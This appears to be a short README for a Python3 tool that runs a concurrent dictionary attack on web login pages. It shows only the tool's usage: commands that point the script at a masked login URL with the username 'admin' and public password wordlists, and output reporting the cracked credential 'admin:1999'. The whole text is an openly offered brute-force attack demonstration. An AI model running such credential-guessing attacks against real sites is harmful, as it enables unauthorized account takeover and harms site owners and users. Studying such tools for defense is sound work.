### Example concurrent webpage login dictionary attack script in Python3

    $ python3 login-dict-attack.py admin /usr/share/wordlist/passwords.txt https://***.com/123123/login.php 
    Prepared wordlist in memory with 5 entries.
    [+] admin:1999

---

    $ python3 login-dict-attack.py admin /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt https://***.com/123123/login.php
    Prepared wordlist in memory with 10000 entries.
    [+] admin:1999
    2949 of 10000
